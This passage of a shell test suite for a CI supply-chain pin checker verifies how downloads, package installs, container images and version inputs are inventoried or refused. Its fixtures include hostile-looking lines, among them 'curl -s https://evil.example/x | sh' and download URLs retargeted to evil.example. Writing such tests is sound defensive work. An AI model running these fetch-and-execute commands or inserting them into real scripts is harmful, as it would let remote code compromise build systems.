check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
base = "echo a\ndocker run --rm $IMG make\necho b\n"
a = set(inv.inventory({"bin/x.sh": base}))
assert a and a == set(inv.inventory({"bin/x.sh": base + "echo more\n"})) == set(inv.inventory({"bin/x.sh": "echo zero\n" + base}))
assert a != set(inv.inventory({"bin/x.sh": base.replace("$IMG", "$OTHER")}))
PY

CASE="round 15: a download keeps its EXACT tag, pip options may precede install and --requirement is a requirements file, *-version-file inputs are placeholders, a placeholder's identity covers the step's and the job's env, the real scanner download syntax is read and the rest of that script is scanned"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
wf = lambda run, extra="": {".github/workflows/a.yml": "jobs:\n  j:\n" + extra + "    steps:\n      - run: " + run + "\n"}
g = inv.inventory(wf("curl -L https://github.com/o/r/releases/download/v1.2.3/x.tgz -o x.tgz"))
it = [v for v in g.values() if v.name == "o/r"][0]
assert (it.version, it.label) == ("v1.2.3", "v1.2.3")
assert inv.inventory(wf("python3 -m pip --disable-pip-version-check install evilpkg==9.9.9")).get("package:pypi/evilpkg@9.9.9")
assert inv.unmeasured(wf("pip install --requirement deps.txt")) and not inv.unmeasured(wf("pip install --requirement .github/pins/adjudicator-requirements.txt"))
uses = {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: actions/setup-python@" + "a" * 40 + " # v6\n        with:\n          python-version-file: .python-version\n"}
assert any("python-version-file@(input)" in k for k in inv.inventory(uses)), sorted(inv.inventory(uses))
a = inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - env:\n          IMAGE: alpine@sha256:" + "a" * 64 + "\n        run: docker run --rm \"$IMAGE\" true\n"})
b = inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - env:\n          IMAGE: evil/image:latest\n        run: docker run --rm \"$IMAGE\" true\n"})
assert [k for k in b if k not in a and "(variable)" in k], "changing the variable's value (env) must change the placeholder's key"
c = inv.inventory(wf("docker run --rm \"$IMAGE\" true", "    env:\n      IMAGE: alpine@sha256:" + "a" * 64 + "\n"))
d = inv.inventory(wf("docker run --rm \"$IMAGE\" true", "    env:\n      IMAGE: evil/x:latest\n"))
assert set(c) != set(d), "a job-level env value changes the identity too"
real = inv.inventory({"bin/install-scanner.sh": 'TRIVY_BASE="${TRIVY_BASE_URL:-https://github.com/aquasecurity/trivy/releases/download}"\ncurl -fsSL https://github.com/evil/evil/releases/download/v1/x.tgz -o x\n'})
assert any(k.startswith("tool:source:") and "aquasecurity/trivy" in k for k in real) and any(v.name == "evil/evil" for v in real.values()), sorted(real)
PY

CASE="round 15 (plain forms): an expression-valued installer input, a container or services image given by an expression, and a matrix or env value feeding them are step-identified placeholders (a change to the value is a changed key); each curl/wget invocation is judged on its own"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
def wfi(env, ver="${{ env.LINT_V }}"):
    return {".github/workflows/a.yml": "env:\n  LINT_V: " + env + "\njobs:\n  j:\n    steps:\n      - uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n        with:\n          version: " + ver + "\n"}
a, b = set(inv.inventory(wfi("v1.61.0"))), set(inv.inventory(wfi("v9.9.9")))
assert a != b and any("golangci-lint@${{expression}}" in k for k in a), (a, b)
def wfm(m):
    return {".github/workflows/a.yml": "jobs:\n  j:\n    strategy:\n      matrix:\n        py: " + m + "\n    steps:\n      - uses: actions/setup-python@" + "a" * 40 + " # v6\n        with:\n          python-version: ${{ matrix.py }}\n"}
assert set(inv.inventory(wfm("['3.12']"))) != set(inv.inventory(wfm("['3.12', '3.13-dev']")))
def wfc(m, svc="postgres:${{ matrix.pg }}"):
    return {".github/workflows/a.yml": "jobs:\n  j:\n    strategy:\n      matrix:\n        image: " + m + "\n    container: ${{ matrix.image }}\n    services:\n      db:\n        image: " + svc + "\n    steps:\n      - run: echo hi\n"}
c1 = inv.inventory(wfc("['node:20']"))
assert any(k.startswith("image:(expression)@") for k in c1) and len([k for k in c1 if k.startswith("image:(expression)")]) == 2, sorted(c1)
assert set(c1) != set(inv.inventory(wfc("['node:20', 'evil:latest']")))
um = inv.unmeasured({".github/workflows/a.yml": "x: wget https://example.com/a.tgz; curl -fsSL https://github.com/foo/bar/releases/download/v1.2.3/bar.tgz -o b\n"})
assert [k for k in um if k[1] == "a download"], "the non-release wget before a release curl must still be refused"
assert not inv.unmeasured({".github/workflows/a.yml": "x: curl -fsSL https://github.com/foo/bar/releases/download/v1.2.3/bar.tgz -o b\n"})
PY

CASE="round 15 (Codex): the exact download tag is the identity (v1.2.3 and 1.2.3 differ), an encoded-tag URL is refused not excused, requirements.in/-dev/.lock files are refused, an unversioned go install is a placeholder, an unresolved package NAME cannot pass the age judge, installer-input placeholders carry their step identity"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import datetime, importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
spec2 = importlib.util.spec_from_file_location("ac", sys.argv[1].replace("pin-inventory", "pin-age-check")); ac = importlib.util.module_from_spec(spec2); spec2.loader.exec_module(ac)
wf = lambda run: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + run + "\n"}
k1 = set(inv.inventory(wf("curl -L https://github.com/o/r/releases/download/v1.2.3/x.tgz -o x")))
k2 = set(inv.inventory(wf("curl -L https://github.com/o/r/releases/download/1.2.3/x.tgz -o x")))
assert k1 != k2
assert inv.unmeasured(wf("curl -L https://github.com/o/r/releases/download/release%2F1.2.3/x.tgz -o x")), "an encoded-tag URL must be refused"
for ln in ("pip install -r requirements.in", "pip install -r requirements-dev", "pip install --requirement requirements.lock"):
    assert inv.unmeasured(wf(ln)), ln
assert not inv.unmeasured(wf("pip install -r requirements.txt")) and not inv.unmeasured(wf("pip install -r .github/pins/adjudicator-requirements.txt"))
assert [k for k in inv.inventory(wf("go install -mod=mod github.com/securego/gosec/v2/cmd/gosec")) if "(unversioned)" in k]
u = lambda v: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: actions/setup-python@" + "a" * 40 + " # v6\n        with:\n          python-version-file: " + v + "\n"}
assert set(inv.inventory(u(".python-version"))) != set(inv.inventory(u(".python-version-new")))
PY

CASE="a download SOURCE is an item: url=/URL=/*_BASE_URL assignments in a script and *_BASE_URL/*_URL env at any level; retargeting one (an env override, a url template line) is a changed key and is refused"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
sh = lambda ln: {"bin/install-scanner.sh": "TRIVY_VER=0.74.0\n" + ln + "\ncurl -fsSL \"$url\" -o t\n"}
a = set(inv.inventory(sh('url="${TRIVY_BASE}/v${TRIVY_VER}/trivy.tgz"'))); b = set(inv.inventory(sh('url="https://evil.example/t.tgz"')))
assert a != b and [k for k in b if k not in a and "(source)" in k], (a, b)
envwf = lambda v: {".github/workflows/a.yml": "env:\n  TRIVY_BASE_URL: " + v + "\njobs:\n  j:\n    steps:\n      - run: bin/install-scanner.sh trivy\n"}
assert set(inv.inventory(envwf("https://github.com/aquasecurity/trivy/releases/download"))) != set(inv.inventory(envwf("https://evil.example/dl")))
assert [k for k in inv.inventory(envwf("https://x")) if k.startswith("tool:source:env:trivy_base_url=")]
PY

CASE="round 16 (Codex): go install of a variable and pip3.12 install are placeholders/items; a script placeholder's identity includes the assignments of the variables it references; every URL of a downloader segment is classified by host and path; the downloaded asset name is part of the identity"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
wf = lambda run: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + run + "\n"}
assert [k for k in inv.inventory(wf('go install "$TOOL"')) if "(variable)" in k]
assert inv.inventory(wf("pip3.12 install examplepkg==99.0.0")).get("package:pypi/examplepkg@99.0.0")
a = set(inv.inventory({"bin/x.sh": "TAG=v1.0.0\ndocker run ghcr.io/acme/tool:$TAG true\n"})); b = set(inv.inventory({"bin/x.sh": "TAG=v9.0.0\ndocker run ghcr.io/acme/tool:$TAG true\n"}))
assert a != b
assert inv.unmeasured(wf("curl -fLO https://github.com/cli/cli/releases/download/v2.40.0/gh.tar.gz https://downloads.example/new-tool.tar.gz"))
assert inv.unmeasured(wf("curl -fLO https://mirror.example/github.com/cli/cli/releases/download/v2.40.0/gh.tar.gz"))
assert not inv.unmeasured(wf("curl -fLO https://github.com/cli/cli/releases/download/v2.40.0/gh.tar.gz"))
x = set(inv.inventory(wf("curl -L https://github.com/o/r/releases/download/v1.2.3/old.tgz -o x"))); y = set(inv.inventory(wf("curl -L https://github.com/o/r/releases/download/v1.2.3/new.tgz -o x")))
assert x != y
PY

CASE="an option chain of a thousand tokens before pip/docker is read in milliseconds (no regex backtracking), and docker global options with values (--context x) do not hide the subcommand"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys, time
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
t = time.process_time()  # this process's CPU: in-process parsing only, so box load cannot fail it
for body in ("pip" + " -a" * 1000 + " x", "docker" + " -a" * 1000 + " x", "python3 -m pip" + " -q" * 1000 + " install evilpkg==9.9.9"):
    inv.inventory({"bin/x.sh": body + "\n"})
assert time.process_time() - t < 2, time.process_time() - t
assert inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: docker --context x run evil/x:latest\n"})
PY

CASE="a hostile many-line file or a step that repeats one command hundreds of times is refused quickly (items and lines are bounded), and compound commands (cd x&&pip install y; a;pip install b) are read as separate commands"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys, time
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
t = time.process_time()  # this process's CPU: in-process parsing only, so box load cannot fail it
for files in ({"bin/x.sh": ("pip install " * 320 + "\n") * 100},
              {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: |\n" + "".join("          " + "pip install " * 320 + "\n" for _ in range(100))},
              {"bin/y.sh": "echo\n" * 30000}):
    try:
        inv.inventory(files)
    except RuntimeError:
        pass
    else:
        raise AssertionError("a hostile file was read")
assert time.process_time() - t < 5, time.process_time() - t
got = inv.inventory({"bin/x.sh": "cd x&&pip install foo==1.0\necho hi;pip install bar==2.0\n"})
assert "package:pypi/foo@1.0" in got and "package:pypi/bar@2.0" in got
PY

CASE="removing an installer action's version input leaves a (default) placeholder (refused)"
check python3 - "$here/../supply-chain/pin-inventory.py" "$work" <<'PY'
import importlib.util, sys, subprocess, os, json
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
mk = lambda w: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n" + w}
with_v = inv.inventory(mk("        with:\n          version: v2.13.2\n")); without = inv.inventory(mk(""))
assert [k for k in without if k not in with_v and "(default)" in k], sorted(without)
assert not [k for k in with_v if "(default)" in k]
PY

CASE="phase 2 R2 fixes: version FILES are items (their content is the key), a called workflow's input defaults and a local call's with: change the identity, a changed checksum on a download's step moves it, pip global options with values do not hide install, a second (default) step is its own key"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
assert set(inv.inventory({".python-version": "3.12\n"})) != set(inv.inventory({".python-version": "3.99.9\n"}))
callee = lambda v: {".github/workflows/callee.yml": "on:\n  workflow_call:\n    inputs:\n      lint-version:\n        default: " + v + "\njobs:\n  j:\n    steps:\n      - uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n        with:\n          version: ${{ inputs.lint-version }}\n"}
assert set(inv.inventory(callee("v2.13.2"))) != set(inv.inventory(callee("v9.99.9")))
caller = lambda v: {".github/workflows/caller.yml": "jobs:\n  c:\n    uses: ./.github/workflows/callee.yml\n    with:\n      lint-version: " + v + "\n"}
assert set(inv.inventory(caller("v2.13.2"))) != set(inv.inventory(caller("v9.99.9")))
dl = lambda sm: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: |\n          curl -L https://github.com/o/r/releases/download/v1.2.3/tool.tgz -o tool.tgz\n          echo " + sm + "  tool.tgz | sha256sum --check\n"}
assert set(inv.inventory(dl("a" * 64))) != set(inv.inventory(dl("b" * 64)))
assert inv.inventory({"bin/x.sh": "pip --timeout 60 install evil==9.9.9\n"}).get("package:pypi/evil@9.9.9")
d2 = inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - name: one\n        uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n      - name: two\n        uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n"})
assert len([k for k in d2 if "(default)" in k]) == 2
PY

CASE="bumping an action whose step also carries a placeholder (a checkout with fetch-tags: true, a (default) installer input) moves ONLY the action: the placeholder's identity does not contain the pin, and a boolean input is not an installer input"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
co = lambda sha: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: actions/checkout@" + sha + " # v7\n        with:\n          fetch-tags: true\n"}
a, b = inv.inventory(co("a" * 40)), inv.inventory(co("b" * 40))
assert [k for k in b if k not in a] == ["action:actions/checkout@" + "b" * 40], [k for k in b if k not in a]
assert not [k for k in a if "(input)" in k]
lint = lambda sha: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: golangci/golangci-lint-action@" + sha + " # v9\n"}
assert [k for k in inv.inventory(lint("b" * 40)) if k not in inv.inventory(lint("a" * 40))] == ["action:golangci/golangci-lint-action@" + "b" * 40]
PY

CASE="phase 2 R3 fixes: --isolated is a flag (install is not its value), a version file at any path is an item, two identical unresolved installer steps are two items, a checksum in ANY step of the job moves a download, a python/java/node SERIES (3.12, 21) is not an exact pin"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
assert inv.inventory({"bin/x.sh": "python3 -m pip --isolated install black==99.0.0\n"}).get("package:pypi/black@99.0.0")
assert set(inv.inventory({"config/.python-version": "3.12.1\n"})) != set(inv.inventory({"config/.python-version": "3.99.9\n"}))
two = lambda second: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n      - uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n" + second}
assert len([k for k in inv.inventory(two("")) if "(default)" in k]) == 2
sep = lambda sm: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: curl -L https://github.com/o/r/releases/download/v1.2.3/tool.tgz -o tool.tgz\n      - run: echo " + sm + "  tool.tgz | sha256sum --check\n"}
assert set(inv.inventory(sep("a" * 64))) != set(inv.inventory(sep("b" * 64)))
PY

CASE="phase 2 R5 fixes: repeated expression-valued installer steps are numbered, a checksum FILE's content moves a download, an env source key bound to an expression never prints its name"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
two = lambda v2: {".github/workflows/a.yml": "env:\n  LINT_V: v2.14.0\njobs:\n  j:\n    steps:\n      - uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n        with:\n          version: ${{ env.LINT_V }}\n      - uses: golangci/golangci-lint-action@" + "a" * 40 + " # v9\n        with:\n          version: " + v2 + "\n"}
assert set(inv.inventory(two("v2.13.2"))) != set(inv.inventory(two("${{ env.LINT_V }}")))
assert len([k for k in inv.inventory(two("${{ env.LINT_V }}")) if "expression" in k]) == 2
cs = lambda c: {".github/policy/gh-checksums.txt": c * 64 + "  gh.tar.gz\n"}
assert set(inv.inventory(cs("a"))) != set(inv.inventory(cs("b")))
src = inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    env:\n      PRIVATE_DOWNLOAD_URL: ${{ secrets.PRIVATE_DOWNLOAD_URL }}\n    steps:\n      - run: echo hi\n"})
assert not any("private_download_url" in k.lower() for k in src), sorted(src)
PY

CASE="an image named localhost/... (no port) used by docker run/create with --pull=never is local to the job and is NOT an item (advisor 0203); a pull, a run without --pull=never, a container: or services: image, localhost:PORT/, localhostx/ and a mid-name localhost/ all stay items (a registry can answer for localhost; Codex #187)"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
step = lambda cmd: {".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + cmd + "\n"}
imgs = lambda files: [k for k in inv.inventory(files) if k.startswith("image:")]
D = "@sha256:" + "a" * 64
assert not imgs(step("docker run --pull=never --rm localhost/fa-production true")), "run --pull=never of a localhost/ image is local"
assert not imgs(step("docker create --pull never localhost/fa-debug:latest")), "create --pull never too"
assert imgs(step("docker run --rm localhost/fa-production true")), "a run without --pull=never may pull"
assert imgs(step("docker pull localhost/x" + D)), "a pull downloads from a registry named localhost"
assert imgs(step("docker run --pull=always localhost/x" + D)), "--pull=always downloads"
assert imgs(step("docker run --pull=never localhost:5000/fa-production:1 true")), "localhost:PORT is a registry"
assert imgs(step("docker run --pull=never localhostx/fa-production:1 true")), "a name that only starts with localhost is not local"
assert imgs(step("docker run --pull=never registry.example/localhost/fa:1 true")), "localhost/ in the middle of a name is not local"
assert imgs(step("docker run --pull=never --pull=always localhost/x" + D + " true")), "the LAST --pull wins: always downloads"
assert not imgs(step("docker run --pull=always --pull=never localhost/fa-x true")), "the last --pull is never: local"
assert imgs(step("docker run --pull=never --pull=always localhost/fa-x true")), "the last --pull is always: a tag-only localhost/ image is an item"
assert not imgs(step("podman run --pull never localhost/fa-x true")), "podman and a separate value too"
assert imgs(step("docker pull --pull=never localhost/fa-x")), "docker pull is never exempt (tag-only form: no digest scan to mask a mistake)"
assert imgs(step("docker run localhost/x" + D + " --pull=never")), "a --pull after the image operand is the container's argument, not a policy"
assert imgs(step("docker run --label x --pull always localhost/x" + D + " true")), "--pull always as a separate value downloads"
assert imgs(step("docker pull --pull=never localhost/x" + D)), "docker pull never exempts"
assert imgs(step("docker run --label=--pull=never localhost/x" + D + " true")), "a quoted/attached option VALUE that spells --pull=never is not a policy"
# tag-only forms (no digest scan to mask a mistake): one parser for the policy and the image (Codex #187 round 3)
assert imgs(step("docker run --pull=never --cpu-period 100000 --pull=always localhost/fa-x true")), "a numeric option value before the last --pull"
assert imgs(step("docker run --pull=never --label \"description=hello world\" --pull=always localhost/fa-x true")), "a quoted option value with a space before the last --pull"
assert not imgs(step("docker run --cpu-period 100000 --pull=never localhost/fa-x true")), "a numeric option value before --pull=never stays local"
assert not imgs(step("docker run --label \"description=hello world\" --pull=never localhost/fa-x true")), "a quoted value before --pull=never stays local"
assert imgs(step("docker run localhost/fa-x --pull=never")), "a --pull after the image operand is the container's argument (tag-only)"
assert imgs(step("docker run --name --pull=never localhost/fa-x true")), "an option's value that spells --pull=never is not a policy (tag-only)"
assert imgs(step("docker run --pull=always --rm 123 --pull=never localhost/fa-x")), "a boolean flag does not take the next word: 123 is the operand, the rest are container arguments (Codex #187 round 4)"
assert imgs(step("docker run --frobnicate 5 --pull=never localhost/fa-x true")), "an option of unknown arity withholds the exemption"
assert not imgs(step("docker run -d --rm --init --pull=never localhost/fa-x true")), "known booleans and a known cluster stay local"
assert not imgs(step("docker run -dit --pull=never localhost/fa-x true")), "a short cluster of booleans is known"
assert not imgs(step("docker run --memory=512m --pull=never localhost/fa-x true")), "--name=value of a known value option is known"
sh = {"bin/check.sh": "docker run --pull=never --label \"a b\" --pull=always localhost/fa-x" + D + " true\n"}
assert imgs(sh), "the same in a script"
assert imgs(step("docker run --name --pull=never localhost/x" + D + " true")), "an option's value that spells --pull=never is not a policy"
cs = {".github/workflows/a.yml": "jobs:\n  j:\n    container: localhost/fa-x\n    services:\n      s:\n        image: localhost/fa-y\n    steps:\n      - uses: docker://localhost/fa-z" + D + "\n"}
assert len(imgs(cs)) == 3, imgs(cs)           # container:, services: and uses: docker:// pull their images
PY

# --- REQ-SUP-001-ruled text. The scan stays strict (a line that only MENTIONS curl or wget is an unmeasured download); the BASE branch's exceptions
# file rules such lines by a ROW OF A FILE in the list reviewed_files: {file, ruling}, one row per file, no other field. EVERY unmeasured occurrence in the
# file is ruled text, whatever its count; a row for another file, a row the pull request brings, no row, and a malformed list fail as before (a malformed
# list stops the check, exit 2, never "nothing ruled" and never "everything ruled"). unmeasured_text keeps only non-text rows: a text ruling in it is a
# malformed list. -------------------------------------------------------------------------
# rf.py OUT REPO MODE FILE...: writes an exceptions file with a reviewed_files row per FILE; MODE changes the file (see the table below)
cat >"$work/rf.py" <<'PY'
import hashlib, json, sys
out, repo, mode, *files = sys.argv[1:]
H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()
RULING = "reviewed file: a test fixture"
rows = [{"file": f, "ruling": RULING} for f in files]
um = []
raw = None
if mode in ("all", "ok"): pass
elif mode == "none": rows = []
elif mode == "wrongfile": rows = [dict(r, file="bin/other.sh") for r in rows]
elif mode == "emptyruling": rows[0]["ruling"] = ""
elif mode == "noruling": del rows[0]["ruling"]
elif mode == "extra": rows[0]["note"] = "x"
elif mode == "extrakey": rows[0]["key"] = H("k")
elif mode == "extracount": rows[0]["count"] = 2
elif mode == "dup": rows = rows + [dict(rows[0], ruling="another ruling")]
elif mode == "dupsame": rows = rows + rows[:1]
elif mode == "notdict": rows[0] = [rows[0]["file"], rows[0]["ruling"]]
elif mode == "nofile": del rows[0]["file"]
elif mode == "emptyfile": rows[0]["file"] = ""
elif mode == "notlist": rows = {"rows": rows}
elif mode == "textrow":       # a text ruling in unmeasured_text (the old per-line shape), next to a good reviewed_files row
    um = [{"file": files[0], "form": "a download", "key": H("k"), "line": H("k"), "ruling": "text, not a command: a test line"}]
elif mode == "dupjsonkey": raw = '{"exceptions": [], "unmeasured_text": [], "reviewed_files": [], "reviewed_files": ' + json.dumps(rows) + '}'
elif mode == "duprowkey": raw = '{"exceptions": [], "unmeasured_text": [], "reviewed_files": [' + json.dumps(rows[0])[:-1] + ', "ruling": "another"}]}'
elif mode == "nantop": raw = '{"exceptions": [], "metadata": NaN, "unmeasured_text": [], "reviewed_files": ' + json.dumps(rows) + '}'
elif mode == "infnested": raw = '{"exceptions": [{"x": [Infinity]}], "unmeasured_text": [], "reviewed_files": ' + json.dumps(rows) + '}'
elif mode == "neginfrow": raw = '{"exceptions": [], "unmeasured_text": [], "reviewed_files": [' + json.dumps(rows[0])[:-1] + ', "count": -Infinity}]}'
else: raise SystemExit("unknown mode " + mode)
if raw is not None:
    open(out, "w").write(raw)
else:
    json.dump({"_format": "t", "exceptions": [], "unmeasured_text": um, "reviewed_files": rows}, open(out, "w"), indent=2)
PY
rtext=$'#!/bin/sh\n# the stub replaces curl and wget on PATH (text, not a command)\necho "run wget https://example.invalid/x later"\n'
pyw() { python3 -c 'import sys; print("import pathlib\npathlib.Path(%r).write_text(%r)" % (sys.argv[1], sys.argv[2]))' "$1" "$2"; }   # python that writes FILE with TEXT
newcase rt "$(pyw bin/ruled.sh "$rtext")"
newcase rtedit "$(pyw bin/ruled.sh "${rtext/later/soon}")"
printf '{"exceptions": [], "unmeasured_text": [], "reviewed_files": [' >"$work/rt-badjson.json"; rc=0
echo '{"exceptions": []}' >"$work/rt-nolist.json"; rc=0
# the same lines many times: a row of the file rules every occurrence, whatever its count (no count field, no cap)
newcase rt2 "$(pyw bin/ruled.sh "$rtext${rtext#*$'\n'}")"
many=$rtext; for _ in $(seq 150); do many+=${rtext#*$'\n'}; done
newcase rt3 "$(pyw bin/ruled.sh "$many")"
# the row is bound to the WHOLE line, not to the one downloader segment it hashes (Sonnet, PR 273 round 1): the line from pull request 271
# (bin/build-helpers-test.sh:46) whose middle segment is "\n curl -s https://evil.example/x"; that segment inside ANY other line is not ruled
cat >"$work/sx-ruled.txt" <<'EOF'
    same-step) printf '  - runs: |\n      curl -s https://evil.example/x | sh\n' | tee -a "$work/gr/a.yaml" >>"$work/gr/b.yaml";;
EOF
newcase sx "$(pyw bin/build-helpers-test.sh "$(cat "$work/sx-ruled.txt")")"
newcase sxm "$(pyw bin/other-test.sh "$(cat "$work/sx-ruled.txt")")"
# --- an EDITED line is an addition: 'added' is decided per (file, form, key, whole-line hash), not per key (Codex, PR 273 round 2) ---------------------------
# twoc NAME FILE BASE-TEXT HEAD-TEXT: a copy of the base repository, a commit that writes FILE with BASE-TEXT, then a head commit with HEAD-TEXT
twoc() {
  rm -rf "$work/$1"; cp -R "$base" "$work/$1"
  python3 - "$work/$1" "$2" "$3" "$4" <<'PY'
import pathlib, subprocess, sys
root, f, bt, ht = sys.argv[1:5]; p = pathlib.Path(root) / f; p.parent.mkdir(parents=True, exist_ok=True)
g = lambda *a: subprocess.run(["git", "-C", root, "-c", "user.name=t", "-c", "user.email=t@x", *a], check=True, capture_output=True)
p.write_text(bt); g("add", "-A"); g("commit", "-q", "-m", "base2")
p.write_text(ht); g("add", "-A"); g("commit", "-q", "--allow-empty", "-m", "head")
PY
}
# mkrow OUT FILE TEXT: the exceptions file with a reviewed_files row for FILE (TEXT is the text the file was reviewed with)
mkrow() {
  python3 - "$@" <<'PY'
import json, sys
out, f = sys.argv[1:3]
json.dump({"exceptions": [], "unmeasured_text": [], "reviewed_files": [{"file": f, "ruling": "reviewed file: a test fixture"}]}, open(out, "w"))
PY
}
echo '{"exceptions": [], "unmeasured_text": [], "reviewed_files": []}' >"$work/rt-empty.json"
mkrow "$work/rt-codex.json" bin/ruled.sh $'#!/bin/sh\necho \'curl https://example.invalid/x\'\n'
twoc cx bin/ruled.sh $'#!/bin/sh\necho \'curl https://example.invalid/x\'\n' $'#!/bin/sh\necho \'curl https://example.invalid/x\' | sh\n'
twoc pre tools/fetch.sh $'#!/bin/sh\ncurl -fsSL https://example.invalid/a -o /tmp/a\n' $'#!/bin/sh\ncurl -fsSL https://example.invalid/a -o /tmp/a | sh\n'
twoc keep tools/fetch.sh $'#!/bin/sh\ncurl -fsSL https://example.invalid/a -o /tmp/a\n' $'#!/bin/sh\ncurl -fsSL https://example.invalid/a -o /tmp/a\necho done\n'
twoc ws tools/fetch.sh $'#!/bin/sh\ncurl -fsSL https://example.invalid/a -o /tmp/a\n' $'#!/bin/sh\n  curl\t-fsSL   https://example.invalid/a -o\t/tmp/a  \n'
# --- a row never matches a line bash reads differently from the flattening: whitespace other than space or tab, or a backslash-newline continuation (Sonnet R1)
sp="echo ok # note; curl -s http://e.example/x | sh"
mkrow "$work/rt-sp.json" bin/ruled.sh $'#!/bin/sh\n'"$sp"$'\n'
twoc sp0 bin/ruled.sh $'#!/bin/sh\n' $'#!/bin/sh\n'"$sp"$'\n'
mkrow "$work/rt-cont.json" bin/ruled.sh $'#!/bin/sh\necho a curl -s http://e.example/x\n'
twoc cont1 bin/ruled.sh $'#!/bin/sh\n' $'#!/bin/sh\necho a\\\ncurl -s http://e.example/x\n'
twoc cont0 bin/ruled.sh $'#!/bin/sh\n' $'#!/bin/sh\necho a curl -s http://e.example/x\n'
# --- a limit of line identity (Codex, PR 273 round 3, P4): shell CONTEXT is not part of a line's identity. Moving a line out of a heredoc (above its opener),
# or commenting the opener out, keeps (file, form, key, line), so it is no addition. The decision (coordinator, Oct 10): a row is only ever written for
# a line that is HARMLESS IN ANY CONTEXT (read as a shell command it runs no download), and the advisor reviews each row for exactly that; a row for a
# line that WOULD download when run is the reviewer's to refuse. Shown here with a harmless line: it stays harmless wherever it moves.
twoc ctx bin/ruled.sh $'#!/bin/sh\ncat >stub <<\'EOF\'\necho "curl $*" >>"$CALLS"\nEOF\n' $'#!/bin/sh\necho "curl $*" >>"$CALLS"\ncat >stub <<\'EOF\'\nEOF\n'
# --- a reviewed_files row rules EVERY unmeasured occurrence of its file; the row is {file, ruling} and no other field. ---
BHL='echo "curl $*" >>"$CALLS"'
# --- REQ-SUP-001-AC18: bin/install-build-tools.sh, read by the REAL inventory, yields one measured pin per tool and arch (owner/repo@vX.Y.Z with
# its checksum bound) and nothing unmeasured; the variable-address forms it replaced are refused (a placeholder that is not a pin, or unmeasured) -------
cat >"$work/ibt-inv.py" <<'PY'
import importlib.util, os, re, sys
SC = sys.argv[1]
HOST = "https://github.com/"
TOOLS = {"melange": "chainguard-dev/melange", "apko": "chainguard-dev/apko"}
ARCHES = ("amd64", "arm64")
def load(name):
